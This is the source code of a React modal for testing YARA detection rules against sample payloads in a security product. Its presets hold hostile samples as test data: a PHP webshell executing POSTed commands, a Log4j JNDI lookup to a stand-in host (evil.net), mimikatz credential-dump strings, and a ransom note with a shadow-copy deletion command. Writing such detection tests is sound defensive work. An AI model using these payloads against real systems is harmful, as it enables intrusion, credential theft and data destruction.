"use client";

import React, { useState } from "react";
import {
  X,
  Play,
  CheckCircle2,
  AlertTriangle,
  Clock,
  Terminal,
  FileCode,
  ShieldAlert,
  Sparkles,
} from "lucide-react";
import type { YaraMatchResult, YaraStringMatch } from "@/lib/detection/yara/types";

interface YaraRuleTesterModalProps {
  isOpen: boolean;
  onClose: () => void;
  initialRuleContent?: string;
  initialRuleId?: string;
  availableRules?: Array<{
    id: string;
    name?: string;
    raw_content?: string;
  }>;
}

export function YaraRuleTesterModal({
  isOpen,
  onClose,
  initialRuleContent = "",
  initialRuleId = "",
  availableRules = [],
}: YaraRuleTesterModalProps) {
  const [selectedRuleId, setSelectedRuleId] = useState<string>(initialRuleId || "custom");
  const [rawContent, setRawContent] = useState<string>(
    initialRuleContent ||
      (initialRuleId && availableRules.find((r) => r.id === initialRuleId)?.raw_content) ||
      ""
  );
  const [samplePayload, setSamplePayload] = useState<string>(
    `<?php\n// Suspicious uploaded file\nif(isset($_POST['cmd'])) {\n    $cmd = base64_decode($_POST['cmd']);\n    c99shell();\n    passthru($_POST['cmd']);\n}`
  );
  const [isBase64, setIsBase64] = useState<boolean>(false);
  const [loading, setLoading] = useState<boolean>(false);
  const [result, setResult] = useState<YaraMatchResult | null>(null);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);

  if (!isOpen) return null;

  const handleSelectRule = (ruleId: string) => {
    setSelectedRuleId(ruleId);
    if (ruleId === "custom") return;
    const rule = availableRules.find((r) => r.id === ruleId);
    if (rule?.raw_content) {
      setRawContent(rule.raw_content);
    }
  };

  const loadPreset = (type: string) => {
    switch (type) {
      case "webshell":
        setSamplePayload(
          `<?php\n// Malicious C99 backdoor snippet\neval(base64_decode("c3lzdGVtKCRfR0VUWydjbWQnXS..."));\nc99shell_execute();\npassthru($_POST['cmd']);\n?>`
        );
        setIsBase64(false);
        break;
      case "log4j":
        setSamplePayload(
          `GET /api/search?q=${"${jndi:ldap://198.51.100.42:1389/Exploit}"} HTTP/1.1\nHost: internal.corp\nUser-Agent: \${lower:j}\${lower:n}\${lower:d}\${lower:i}:ldap://evil.net/a`
        );
        setIsBase64(false);
        break;
      case "mimikatz":
        setSamplePayload(
          `0x00401000: sekurlsa::logonpasswords lsass dump hook\n0x00401050: privilege::debug granted\n0x00401080: mimilib.dll loaded into process space`
        );
        setIsBase64(false);
        break;
      case "ransomware":
        setSamplePayload(
          `YOUR ATTENTION PLEASE!\nLockBit 3.0 has encrypted your network.\nAll your files have been encrypted using AES-256 and RSA-4096.\nCommand: vssadmin delete shadows /all /quiet`
        );
        setIsBase64(false);
        break;
      case "clean":
        setSamplePayload(
          `[2026-10-07 09:30:15] INFO: Application healthcheck passed nominal. Database connection pool healthy. 0 errors reported.`
        );
        setIsBase64(false);
        break;
    }
  };

  const handleScanPayload = async () => {
    setLoading(true);
    setResult(null);
    setErrorMsg(null);

    try {
      const res = await fetch("/api/threats/yara/test", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          raw_content: rawContent,
          sample_payload: samplePayload,
          is_base64: isBase64,
        }),
      });

      const data = await res.json();
      if (!res.ok) {
        setErrorMsg(
          data.error +
            (data.line ? ` (Line ${data.line}, Col ${data.column}): ${data.message || ""}` : "")
        );
      } else {
        setResult(data);
      }
    } catch (err: unknown) {
      setErrorMsg(err instanceof Error ? err.message : "Failed to scan payload");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="fixed inset-0 z-50 bg-black/70 backdrop-blur-sm flex items-center justify-center p-4 overflow-y-auto">
      <div className="relative w-full max-w-4xl bg-[var(--sd-surface)] border border-[var(--sd-border)] rounded-2xl shadow-2xl flex flex-col max-h-[92vh] overflow-hidden">
        {/* Modal Header */}
        <div className="px-6 py-4 border-b border-[var(--sd-border)] flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="p-2 rounded-xl bg-[var(--sd-danger-dim)] text-[var(--sd-danger)] border border-[var(--sd-danger-border)]">
              <ShieldAlert className="h-5 w-5" />
            </div>
            <div>
              <h2 className="text-lg font-medium text-[var(--sd-text)]">
                YARA Rule Tester Sandbox
              </h2>
              <p className="text-xs text-[var(--sd-text-muted)]">
                Dry-run YARA signature parsing and payload pattern matching in real-time
              </p>
            </div>
          </div>
          <button
            onClick={onClose}
            className="p-1.5 rounded-lg text-[var(--sd-text-muted)] hover:text-[var(--sd-text)] hover:bg-[var(--sd-surface-subtle)] transition cursor-pointer"
          >
            <X className="h-5 w-5" />
          </button>
        </div>

        {/* Modal Content */}
        <div className="p-6 overflow-y-auto space-y-5 flex-1">
          {/* Top Controls: Rule Selector & Presets */}
          <div className="flex flex-col sm:flex-row gap-3 items-start sm:items-center justify-between">
            <div className="flex items-center gap-2 w-full sm:w-auto">
              <span className="text-xs font-medium text-[var(--sd-text-muted)] whitespace-nowrap">
                Active Rule:
              </span>
              <select
                value={selectedRuleId}
                onChange={(e) => handleSelectRule(e.target.value)}
                className="bg-[var(--sd-bg)] text-[var(--sd-text)] border border-[var(--sd-border)] text-xs rounded-lg px-2.5 py-1.5 font-mono focus:outline-none focus:ring-1 focus:ring-[var(--sd-pine)]"
              >
                <option value="custom">Custom Rule Content</option>
                {availableRules.map((r) => (
                  <option key={r.id} value={r.id}>
                    {r.name || r.id}
                  </option>
                ))}
              </select>
            </div>

            {/* Quick Test Presets */}
            <div className="flex flex-wrap items-center gap-1.5">
              <span className="text-[11px] text-[var(--sd-text-muted)] mr-1">Presets:</span>
              <button
                type="button"
                onClick={() => loadPreset("webshell")}
                className="px-2 py-1 text-[11px] font-mono rounded bg-[var(--sd-surface-subtle)] hover:bg-[var(--sd-border)] border border-[var(--sd-border)] text-[var(--sd-text)] transition cursor-pointer"
              >
                WebShell PHP
              </button>
              <button
                type="button"
                onClick={() => loadPreset("log4j")}
                className="px-2 py-1 text-[11px] font-mono rounded bg-[var(--sd-surface-subtle)] hover:bg-[var(--sd-border)] border border-[var(--sd-border)] text-[var(--sd-text)] transition cursor-pointer"
              >
                Log4j JNDI
              </button>
              <button
                type="button"
                onClick={() => loadPreset("mimikatz")}
                className="px-2 py-1 text-[11px] font-mono rounded bg-[var(--sd-surface-subtle)] hover:bg-[var(--sd-border)] border border-[var(--sd-border)] text-[var(--sd-text)] transition cursor-pointer"
              >
                Mimikatz Dump
              </button>
              <button
                type="button"
                onClick={() => loadPreset("ransomware")}
                className="px-2 py-1 text-[11px] font-mono rounded bg-[var(--sd-surface-subtle)] hover:bg-[var(--sd-border)] border border-[var(--sd-border)] text-[var(--sd-text)] transition cursor-pointer"
              >
                LockBit Note
              </button>
              <button
                type="button"
                onClick={() => loadPreset("clean")}
                className="px-2 py-1 text-[11px] font-mono rounded bg-[var(--sd-surface-subtle)] hover:bg-[var(--sd-border)] border border-[var(--sd-border)] text-[var(--sd-text)] transition cursor-pointer"
              >
                Clean Benign
              </button>
            </div>
          </div>

          {/* Grid Layout: Rule Definition & Candidate Payload */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {/* Left: YARA Rule */}
            <div className="space-y-1.5">
              <div className="flex items-center justify-between text-xs text-[var(--sd-text-muted)]">
                <span className="flex items-center gap-1.5 font-medium">
                  <FileCode className="h-3.5 w-3.5 text-[var(--sd-pine)]" />
                  YARA Rule Syntax (.yar)
                </span>
                <span className="text-[11px] font-mono">AST Compliant</span>
              </div>
              <textarea
                value={rawContent}
                onChange={(e) => {
                  setRawContent(e.target.value);
                  setSelectedRuleId("custom");
                }}
                rows={12}
                placeholder="rule My_Malware_Rule { ... }"
                className="w-full bg-[var(--sd-bg)] text-[var(--sd-text)] border border-[var(--sd-border)] rounded-xl p-3 text-xs font-mono leading-relaxed focus:outline-none focus:ring-1 focus:ring-[var(--sd-pine)] resize-none"
              />
            </div>

            {/* Right: Sample Payload */}
            <div className="space-y-1.5">
              <div className="flex items-center justify-between text-xs text-[var(--sd-text-muted)]">
                <span className="flex items-center gap-1.5 font-medium">
                  <Terminal className="h-3.5 w-3.5 text-[var(--sd-pine)]" />
                  Sample Payload / Telemetry Data
                </span>
                <label className="flex items-center gap-1.5 text-[11px] cursor-pointer">
                  <input
                    type="checkbox"
                    checked={isBase64}
                    onChange={(e) => setIsBase64(e.target.checked)}
                    className="rounded border-[var(--sd-border)] text-[var(--sd-pine)] focus:ring-0"
                  />
                  <span>Decode Base64</span>
                </label>
              </div>
              <textarea
                value={samplePayload}
                onChange={(e) => setSamplePayload(e.target.value)}
                rows={12}
                placeholder="Paste code snippet, memory hex, or process command line..."
                className="w-full bg-[var(--sd-bg)] text-[var(--sd-text)] border border-[var(--sd-border)] rounded-xl p-3 text-xs font-mono leading-relaxed focus:outline-none focus:ring-1 focus:ring-[var(--sd-pine)] resize-none"
              />
            </div>
          </div>

          {/* Error Banner */}
          {errorMsg && (
            <div className="p-3.5 rounded-xl border border-[var(--sd-danger-border)] bg-[var(--sd-danger-dim)] text-xs text-[var(--sd-danger)] flex items-start gap-2.5">
              <AlertTriangle className="h-4 w-4 shrink-0 mt-0.5 text-[var(--sd-danger)]" />
              <div>
                <span className="font-semibold">Scanner Diagnostic:</span> {errorMsg}
              </div>
            </div>
          )}

          {/* Scan Results Display */}
          {result && (
            <div className="space-y-3 pt-1">
              <div
                className={`p-4 rounded-xl border flex items-center justify-between shadow-xs ${
                  result.matched
                    ? "bg-[var(--sd-danger-dim)] border-[var(--sd-danger-border)] text-[var(--sd-danger)]"
                    : "bg-[var(--sd-success-dim)] border-[var(--sd-success-border)] text-[var(--sd-success)]"
                }`}
              >
                <div className="flex items-center gap-3">
                  {result.matched ? (
                    <ShieldAlert className="h-5 w-5 shrink-0" />
                  ) : (
                    <CheckCircle2 className="h-5 w-5 shrink-0" />
                  )}
                  <div>
                    <div className="font-semibold text-sm">
                      {result.matched ? "THREAT MATCH DETECTED" : "PAYLOAD CLEAN — NO MATCH"}
                    </div>
                    <div className="text-xs opacity-90 font-mono">
                      Rule: {result.ruleName} ({result.ruleId}) • {result.matches?.length || 0} match occurrences
                    </div>
                  </div>
                </div>

                <div className="flex items-center gap-1.5 font-mono text-xs opacity-80">
                  <Clock className="h-3.5 w-3.5" />
                  <span>{result.executionTimeMs} ms</span>
                </div>
              </div>

              {/* Matched String Evidence List */}
              {result.matched && result.matches && result.matches.length > 0 && (
                <div className="border border-[var(--sd-border)] rounded-xl overflow-hidden sd-surface">
                  <div className="px-3.5 py-2 bg-[var(--sd-surface-subtle)] border-b border-[var(--sd-border)] text-[11px] font-medium text-[var(--sd-text-muted)] uppercase tracking-wider">
                    Matched Strings &amp; Byte Offsets ({result.matches.length})
                  </div>
                  <div className="divide-y divide-[var(--sd-border)] max-h-48 overflow-y-auto">
                    {result.matches.map((m: YaraStringMatch, idx: number) => (
                      <div key={idx} className="p-3 text-xs font-mono space-y-1">
                        <div className="flex items-center justify-between text-[11px]">
                          <span className="font-semibold text-[var(--sd-danger)]">{m.id}</span>
                          <span className="text-[var(--sd-text-muted)]">
                            Offset: {m.offset} • Length: {m.length}
                          </span>
                        </div>
                        <div className="p-2 rounded bg-[var(--sd-bg)] border border-[var(--sd-border)] text-[var(--sd-text)] break-all">
                          <code>{m.snippet}</code>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </div>
          )}
        </div>

        {/* Modal Footer */}
        <div className="px-6 py-4 border-t border-[var(--sd-border)] bg-[var(--sd-surface-subtle)] flex items-center justify-between">
          <div className="text-xs text-[var(--sd-text-muted)] flex items-center gap-1.5">
            <Sparkles className="h-3.5 w-3.5 text-[var(--sd-pine)]" />
            <span>Execution safety limit: 50ms ReDoS boundary</span>
          </div>

          <div className="flex items-center gap-2">
            <button
              type="button"
              onClick={onClose}
              className="px-3 py-1.5 rounded-lg border border-[var(--sd-border)] text-xs text-[var(--sd-text-muted)] hover:text-[var(--sd-text)] hover:bg-[var(--sd-surface)] transition cursor-pointer"
            >
              Close
            </button>
            <button
              type="button"
              onClick={handleScanPayload}
              disabled={loading || !rawContent.trim()}
              className="flex items-center gap-1.5 px-4 py-1.5 rounded-lg bg-[var(--sd-pine)] hover:bg-[var(--sd-pine-bright)] text-black text-xs font-medium shadow-xs transition cursor-pointer disabled:opacity-50"
            >
              <Play className="h-3.5 w-3.5" />
              <span>{loading ? "Scanning..." : "Scan Payload"}</span>
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
